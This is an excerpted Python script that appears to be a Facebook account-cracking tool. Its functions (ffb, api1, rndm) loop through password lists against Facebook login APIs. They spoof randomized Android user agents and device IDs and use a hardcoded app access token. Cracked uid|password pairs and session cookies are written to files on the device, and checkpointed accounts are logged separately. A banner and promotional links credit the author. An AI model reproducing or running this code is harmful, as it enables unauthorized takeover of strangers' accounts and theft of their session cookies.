...
os.system('xdg-open "xdg-open https://www.youtube.com/@ExoXKaiishu/')
...
os.system("clear")
print("\033[1;32mJOIN MY \033[1;31mFACEBOOK \033[1;32mGYS")
os.system("xdg-open https://www.facebook.com/profile.php?id=100094433793140&mibextid=rS40aB7S9Ucbxw6v/")
__KAIISHUKAII__=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻 UCHIHA X 🍂💛MALIK WALEE 🙂💗 \x07')
#app  check 
...
\t[×] Developed By '\033[1;34m'FATIMA AWAN
{WHITE}[•] AUTHOR       : FATIMA AWAN
{WHITE}[•] GITHUB        : '\033[1;91m'WALEE143
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [WALEE-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/263.0.0.19.52;FBBV/57011850;FBDM/{density=2.0,width=720,height=1080};FBLC/en_PK;FBCR/Zong;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.lite;FBDV/SM-D514J;FBSV/9.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
...
def api1(ids,names,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/222.0.0.30.49;FBBV/59493845;FBDM/{density=2.0,width=1280,height=720};FBLC/it_IT;FBCR/Mobilnk;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-O369U;FBSV/7.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [WALEE--OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/WALEE-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/WALEE-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [WALEE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/WALEE-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MALIK-WALEE] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/190.0.0.20.147;FBBV/28882906;FBDM/{density=1.5,width=1080,height=720};FBLC/en_US;FBCR/Ufone;FBMF/Xiaomic;FBBD/Xiaomic;FBPN/com.facebook.lite;FBDV/SM-R911A;FBSV/8.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"""
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/WALEE-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/WALEE-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
